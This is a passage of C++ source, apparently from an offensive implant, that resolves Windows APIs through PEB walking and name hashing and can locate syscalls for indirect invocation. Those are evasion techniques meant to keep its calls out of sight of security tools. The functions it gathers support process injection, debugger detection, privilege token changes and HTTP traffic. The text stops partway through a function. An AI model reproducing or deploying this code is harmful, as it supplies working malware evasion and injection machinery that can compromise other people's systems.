#include "core/procs.hpp"

namespace Procs
{
    // It's used to calculate hash for modules.
    ULONG StringToHashModule(WCHAR* wStr, SIZE_T dwStrLen)
    {
        ULONG  dwHash   = HASH_IV;
        WCHAR* pwStr    = wStr;
        SIZE_T dwCnt    = 0;

        do
        {
            WCHAR c = *pwStr;

            if (!c)
            {
                break;
            }

            // If a character is uppercase, convert it to lowercase.
            if (c >= L'A' && c <= L'Z')
            {
                c += L'a' - L'A';
            }

            dwHash = dwHash * RANDOM_ADDR + c;
            ++pwStr;
            dwCnt++;

            if (dwStrLen > 0 && dwCnt >= dwStrLen)
            {
                break;
            }
        } while (TRUE);

        return dwHash & 0xFFFFFFFF;
    }

    // It's used to calculate hash for functions.
    DWORD StringToHashFunc(char* str)
    {
        int c;
        DWORD dwHash = HASH_IV;

        while (c = *str++)
        {
            dwHash = dwHash * RANDOM_ADDR + c;
        }

        return dwHash & 0xFFFFFFFF;
    }

    PVOID GetModuleByHash(DWORD dwHash)
    {
        PTEB pTeb = NtCurrentTeb();
        // PPEB pPeb = (PPEB)PPEB_PTR;
        PPEB pPeb = pTeb->ProcessEnvironmentBlock;
        PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;

        // Get the first entry
        PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InLoadOrderModuleList.Flink;

        while (pDte)
        {
            if (StringToHashModule(pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == dwHash)
            {
                return pDte->DllBase;
            }

            // Get the next entry
            pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
        }

        return nullptr;
    }

    // Load a module with LdrLoadDll.
    PVOID LoadModule(PPROCS pProcs, LPWSTR lpDllName)
    {
        PVOID pModule = nullptr;
        LPCWSTR lpcDllName = static_cast<LPCWSTR>(lpDllName);

        // Get string length
        LPCWSTR wStr2;
        for (wStr2 = lpcDllName; *wStr2; ++wStr2);
		USHORT uDllNameLen = (wStr2 - lpcDllName) * sizeof(WCHAR);

		UNICODE_STRING usDllName = {0};
		usDllName.Buffer = lpDllName;
		usDllName.Length = uDllNameLen;
        usDllName.MaximumLength = uDllNameLen + sizeof(WCHAR);

		NTSTATUS status = CallSysInvoke(
			&pProcs->sysLdrLoadDll,
			pProcs->lpLdrLoadDll,
			nullptr,
			nullptr,
			&usDllName,
			&pModule
		);
		if (status != STATUS_SUCCESS || !pModule)
		{
			return nullptr;
		}

        return pModule;
    }

    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    ) {
        PVOID pFuncAddr = nullptr;

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

        PIMAGE_EXPORT_DIRECTORY pExportDirRVA = (PIMAGE_EXPORT_DIRECTORY)(
            (DWORD_PTR)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        );

        PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDirRVA->AddressOfFunctions);
        PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDirRVA->AddressOfNames);
        PWORD pdwAddrOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + pExportDirRVA->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDirRVA->NumberOfFunctions; i++)
        {
            DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
            DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
            char* sFuncName = (char*)dwpFuncNameRVA;
            DWORD_PTR dwpFuncAddrRVA = 0;

            DWORD dwFuncNameHash = StringToHashFunc(sFuncName);
            if (dwFuncNameHash == dwHash)
            {
                dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdinalsRVA[i]];
                pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
                return pFuncAddr;
            }
        }

        return nullptr;
    }

    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        BOOL    bIndirectSyscalls
    ) {
        PPROCS pProcs = new PROCS;
    
        // NTAPI (Ntdll)
        PVOID pLdrLoadDll                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_LDRLOADDLL);
        pProcs->lpLdrLoadDll                    = reinterpret_cast<LPPROC_LDRLOADDLL>(pLdrLoadDll);
        PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTADJUSTPRIVILEGESTOKEN);
        pProcs->lpNtAdjustPrivilegesToken       = reinterpret_cast<LPPROC_NTADJUSTPRIVILEGESTOKEN>(pNtAdjustPrivilegesToken);
        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
        pProcs->lpNtAllocateVirtualMemory       = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
        PVOID pNtClose                          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCLOSE);
        pProcs->lpNtClose                       = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
        PVOID pNtCreateFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEFILE);
        pProcs->lpNtCreateFile                  = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
        PVOID pNtCreateNamedPipeFile            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATENAMEDPIPEFILE);
        pProcs->lpNtCreateNamedPipeFile         = reinterpret_cast<LPPROC_NTCREATENAMEDPIPEFILE>(pNtCreateNamedPipeFile);
        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEPROCESSEX);
        pProcs->lpNtCreateProcessEx             = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATETHREADEX);
        pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
        PVOID pNtDeleteFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDELETEFILE);
        pProcs->lpNtDeleteFile                  = reinterpret_cast<LPPROC_NTDELETEFILE>(pNtDeleteFile);
        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDUPLICATEOBJECT);
        pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
        PVOID pNtEnumerateValueKey              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTENUMERATEVALUEKEY);
        pProcs->lpNtEnumerateValueKey           = reinterpret_cast<LPPROC_NTENUMERATEVALUEKEY>(pNtEnumerateValueKey);
        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTFREEVIRTUALMEMORY);
        pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
        PVOID pNtGetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTGETCONTEXTTHREAD);
        pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
        PVOID pNtOpenFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENFILE);
        pProcs->lpNtOpenFile                    = reinterpret_cast<LPPROC_NTOPENFILE>(pNtOpenFile);
        PVOID pNtOpenKeyEx                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENKEYEX);
        pProcs->lpNtOpenKeyEx                   = reinterpret_cast<LPPROC_NTOPENKEYEX>(pNtOpenKeyEx);
        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESS);
        pProcs->lpNtOpenProcess                 = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESSTOKEN);
        pProcs->lpNtOpenProcessToken            = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
        PVOID pNtPrivilegeCheck                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPRIVILEGECHECK);
        pProcs->lpNtPrivilegeCheck              = reinterpret_cast<LPPROC_NTPRIVILEGECHECK>(pNtPrivilegeCheck);
        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
        pProcs->lpNtProtectVirtualMemory        = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONFILE);
        pProcs->lpNtQueryInformationFile        = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtQueryInformationFile);
        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
        pProcs->lpNtQueryInformationProcess     = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
        PVOID pNtQueryInformationToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONTOKEN);
        pProcs->lpNtQueryInformationToken       = reinterpret_cast<LPPROC_NTQUERYINFORMATIONTOKEN>(pNtQueryInformationToken);
        PVOID pNtQueryKey                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYKEY);
        pProcs->lpNtQueryKey                    = reinterpret_cast<LPPROC_NTQUERYKEY>(pNtQueryKey);
        PVOID pNtQuerySystemInformation         = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
        pProcs->lpNtQuerySystemInformation      = reinterpret_cast<LPPROC_NTQUERYSYSTEMINFORMATION>(pNtQuerySystemInformation);
        PVOID pNtReadFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADFILE);
        pProcs->lpNtReadFile                    = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADVIRTUALMEMORY);
        pProcs->lpNtReadVirtualMemory           = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
        PVOID pNtResumeThread                   = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTRESUMETHREAD);
        pProcs->lpNtResumeThread                = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
        PVOID pNtSetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETCONTEXTTHREAD);
        pProcs->lpNtSetContextThread            = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
        PVOID pNtSetInformationFile             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETINFORMATIONFILE);
        pProcs->lpNtSetInformationFile          = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtSetInformationFile);
        PVOID pNtSystemDebugControl             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSYSTEMDEBUGCONTROL);
        pProcs->lpNtSystemDebugControl          = reinterpret_cast<LPPROC_NTSYSTEMDEBUGCONTROL>(pNtSystemDebugControl);
        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTTERMINATEPROCESS);
        pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTUNMAPVIEWOFSECTION);
        pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWAITFORSINGLEOBJECT);
        pProcs->lpNtWaitForSingleObject         = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
        PVOID pNtWriteFile                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEFILE);
        pProcs->lpNtWriteFile                   = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEVIRTUALMEMORY);
        pProcs->lpNtWriteVirtualMemory          = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLALLOCATEHEAP);
        pProcs->lpRtlAllocateHeap               = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
        PVOID pRtlGetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETCURRENTDIRECTORY_U);
        pProcs->lpRtlGetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLGETCURRENTDIRECTORY_U>(pRtlGetCurrentDirectory_U);
        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETFULLPATHNAME_U);
        pProcs->lpRtlGetFullPathName_U          = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLINITUNICODESTRING);
        pProcs->lpRtlInitUnicodeString          = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
        PVOID pRtlSetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSETCURRENTDIRECTORY_U);
        pProcs->lpRtlSetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLSETCURRENTDIRECTORY_U>(pRtlSetCurrentDirectory_U);
        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCATW);
        pProcs->lpRtlStringCchCatW              = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCOPYW);
        pProcs->lpRtlStringCchCopyW             = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHLENGTHW);
        pProcs->lpRtlStringCchLengthW           = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLZEROMEMORY);
        pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);

        // WINAPI (Kernel32)
        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT);
        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
        PVOID pCloseHandle                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CLOSEHANDLE);
        pProcs->lpCloseHandle                   = reinterpret_cast<LPPROC_CLOSEHANDLE>(pCloseHandle);
        PVOID pCreateFileW                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEFILEW);
        pProcs->lpCreateFileW                   = reinterpret_cast<LPPROC_CREATEFILEW>(pCreateFileW);
        PVOID pCreatePipe                       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEPIPE);
        pProcs->lpCreatePipe                    = reinterpret_cast<LPPROC_CREATEPIPE>(pCreatePipe);
        PVOID pCreateProcessW                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEPROCESSW);
        pProcs->lpCreateProcessW                = reinterpret_cast<LPPROC_CREATEPROCESSW>(pCreateProcessW);
        PVOID pCreateRemoteThreadEx             = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATEREMOTETHREADEX);
        pProcs->lpCreateRemoteThreadEx          = reinterpret_cast<LPPROC_CREATEREMOTETHREADEX>(pCreateRemoteThreadEx);
        PVOID pGetComputerNameW                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETCOMPUTERNAMEW);
        pProcs->lpGetComputerNameW              = reinterpret_cast<LPPROC_GETCOMPUTERNAMEW>(pGetComputerNameW);
        PVOID pExpandEnvironmentStringsW        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_EXPANDENVIRONMENTSTRINGSW);
        pProcs->lpExpandEnvironmentStringsW     = reinterpret_cast<LPPROC_EXPANDENVIRONMENTSTRINGSW>(pExpandEnvironmentStringsW);
        PVOID pFreeEnvironmentStringsW          = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FREEENVIRONMENTSTRINGSW);
        pProcs->lpFreeEnvironmentStringsW       = reinterpret_cast<LPPROC_FREEENVIRONMENTSTRINGSW>(pFreeEnvironmentStringsW);
        PVOID pFindFirstFileW                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FINDFIRSTFILEW);
        pProcs->lpFindFirstFileW                = reinterpret_cast<LPPROC_FINDFIRSTFILEW>(pFindFirstFileW);
        PVOID pFindNextFileW                    = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_FINDNEXTFILEW);
        pProcs->lpFindNextFileW                 = reinterpret_cast<LPPROC_FINDNEXTFILEW>(pFindNextFileW);
        PVOID pGetEnvironmentStringsW           = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETENVIRONMENTSTRINGSW);
        pProcs->lpGetEnvironmentStringsW        = reinterpret_cast<LPPROC_GETENVIRONMENTSTRINGSW>(pGetEnvironmentStringsW);
        PVOID pGetLastError                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETLASTERROR);
        pProcs->lpGetLastError                  = reinterpret_cast<LPPROC_GETLASTERROR>(pGetLastError);
        PVOID pGetModuleFileNameW               = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETMODULEFILENAMEW);
        pProcs->lpGetModuleFileNameW            = reinterpret_cast<LPPROC_GETMODULEFILENAMEW>(pGetModuleFileNameW);
        PVOID pGetProcessHeap                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETPROCESSHEAP);
        pProcs->lpGetProcessHeap                = reinterpret_cast<LPPROC_GETPROCESSHEAP>(pGetProcessHeap);
        PVOID pGetSystemDirectoryW              = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETSYSTEMDIRECTORYW);
        pProcs->lpGetSystemDirectoryW           = reinterpret_cast<LPPROC_GETSYSTEMDIRECTORYW>(pGetSystemDirectoryW);
        PVOID pHeapAlloc                        = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_HEAPALLOC);
        pProcs->lpHeapAlloc                     = reinterpret_cast<LPPROC_HEAPALLOC>(pHeapAlloc);
        PVOID pHeapFree                         = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_HEAPFREE);
        pProcs->lpHeapFree                      = reinterpret_cast<LPPROC_HEAPFREE>(pHeapFree);
        PVOID pLoadLibraryA                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOADLIBRARYA);
        pProcs->lpLoadLibraryA                  = reinterpret_cast<LPPROC_LOADLIBRARYA>(pLoadLibraryA);
        PVOID pLoadLibraryW                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOADLIBRARYW);
        pProcs->lpLoadLibraryW                  = reinterpret_cast<LPPROC_LOADLIBRARYW>(pLoadLibraryW);
        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_ISDEBUGGERPRESENT);
        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
        PVOID pOpenProcess                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_OPENPROCESS);
        pProcs->lpOpenProcess                   = reinterpret_cast<LPPROC_OPENPROCESS>(pOpenProcess);
        PVOID pOpenProcessToken                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_OPENPROCESSTOKEN);
        pProcs->lpOpenProcessToken              = reinterpret_cast<LPPROC_OPENPROCESSTOKEN>(pOpenProcessToken);
        PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_QUERYFULLPROCESSIMAGENAMEW);
        pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(pQueryFullProcessImageNameW);
        PVOID pReadFile                         = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_READFILE);
        pProcs->lpReadFile                      = reinterpret_cast<LPPROC_READFILE>(pReadFile);
        PVOID pReadProcessMemory                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_READPROCESSMEMORY);
        pProcs->lpReadProcessMemory             = reinterpret_cast<LPPROC_READPROCESSMEMORY>(pReadProcessMemory);
        PVOID pRtlCopyMemory                    = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_RTLCOPYMEMORY);
        pProcs->lpRtlCopyMemory                 = reinterpret_cast<LPPROC_RTLCOPYMEMORY>(pRtlCopyMemory);
        PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETFILEINFORMATIONBYHANDLE);
        pProcs->lpSetFileInformationByHandle    = reinterpret_cast<LPPROC_SETFILEINFORMATIONBYHANDLE>(pSetFileInformationByHandle);
        PVOID pSetHandleInformation             = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETHANDLEINFORMATION);
        pProcs->lpSetHandleInformation          = reinterpret_cast<LPPROC_SETHANDLEINFORMATION>(pSetHandleInformation);
        PVOID pTerminateProcess                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_TERMINATEPROCESS);
        pProcs->lpTerminateProcess              = reinterpret_cast<LPPROC_TERMINATEPROCESS>(pTerminateProcess);
        PVOID pVirtualAllocEx                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_VIRTUALALLOCEX);
        pProcs->lpVirtualAllocEx                = reinterpret_cast<LPPROC_VIRTUALALLOCEX>(pVirtualAllocEx);
        PVOID pVirtualFree                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_VIRTUALFREE);
        pProcs->lpVirtualFree                   = reinterpret_cast<LPPROC_VIRTUALFREE>(pVirtualFree);
        PVOID pVirtualProtectEx                 = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_VIRTUALPROTECTEX);
        pProcs->lpVirtualProtectEx              = reinterpret_cast<LPPROC_VIRTUALPROTECTEX>(pVirtualProtectEx);
        PVOID pWriteProcessMemory               = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_WRITEPROCESSMEMORY);
        pProcs->lpWriteProcessMemory            = reinterpret_cast<LPPROC_WRITEPROCESSMEMORY>(pWriteProcessMemory);

        if (bIndirectSyscalls)
        {
            pProcs->sysLdrLoadDll                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pLdrLoadDll));
            pProcs->sysNtAdjustPrivilegesToken      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAdjustPrivilegesToken));
            pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
            pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
            pProcs->sysNtCreateFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateFile));
            pProcs->sysNtCreateNamedPipeFile        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateNamedPipeFile));
            pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
            pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
            pProcs->sysNtDeleteFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDeleteFile));
            pProcs->sysNtDuplicateObject            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDuplicateObject));
            pProcs->sysNtEnumerateValueKey          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtEnumerateValueKey));
            pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
            pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
            pProcs->sysNtOpenFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenFile));
            pProcs->sysNtOpenProcess                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcess));
            pProcs->sysNtOpenProcessToken           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcessToken));
            pProcs->sysNtOpenKeyEx                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenKeyEx));
            pProcs->sysNtPrivilegeCheck             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtPrivilegeCheck));
            pProcs->sysNtProtectVirtualMemory       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtProtectVirtualMemory));
            pProcs->sysNtQueryInformationFile       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationFile));
            pProcs->sysNtQueryInformationProcess    = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationProcess));
            pProcs->sysNtQueryInformationToken      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationToken));
            pProcs->sysNtQueryKey                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryKey));
            pProcs->sysNtQuerySystemInformation     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQuerySystemInformation));
            pProcs->sysNtReadFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadFile));
            pProcs->sysNtReadVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadVirtualMemory));
            pProcs->sysNtResumeThread               = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtResumeThread));
            pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
            pProcs->sysNtSetInformationFile         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationFile));
            pProcs->sysNtSystemDebugControl         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSystemDebugControl));
            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
            pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
            pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
            pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
            pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
            pProcs->sysRtlAllocateHeap              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlAllocateHeap));
            pProcs->sysRtlGetCurrentDirectory_U     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetCurrentDirectory_U));
            pProcs->sysRtlGetFullPathName_U         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetFullPathName_U));
            pProcs->sysRtlInitUnicodeString         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlInitUnicodeString));          
            pProcs->sysRtlSetCurrentDirectory_U     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlSetCurrentDirectory_U));
        }

        return pProcs;
    }

    VOID FindProcsMisc(
        Procs::PPROCS pProcs,
        HMODULE hAdvapi32DLL,
        HMODULE hBcryptDLL,
        HMODULE hCrypt32DLL,
        HMODULE hNetapi32DLL,
        HMODULE hWinHTTPDLL
    ) {
        // Advapi32
        PVOID pGetUserNameW                     = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_GETUSERNAMEW);
        pProcs->lpGetUserNameW                  = reinterpret_cast<LPPROC_GETUSERNAMEW>(pGetUserNameW);
        PVOID pAdjustTokenPrivileges            = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_ADJUSTTOKENPRIVILEGES);
        pProcs->lpAdjustTokenPrivileges         = reinterpret_cast<LPPROC_ADJUSTTOKENPRIVILEGES>(pAdjustTokenPrivileges);
        PVOID pLookupPrivilegeValueW            = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_LOOKUPPRIVILEGEVALUEW);
        pProcs->lpLookupPrivilegeValueW         = reinterpret_cast<LPPROC_LOOKUPPRIVILEGEVALUEW>(pLookupPrivilegeValueW);
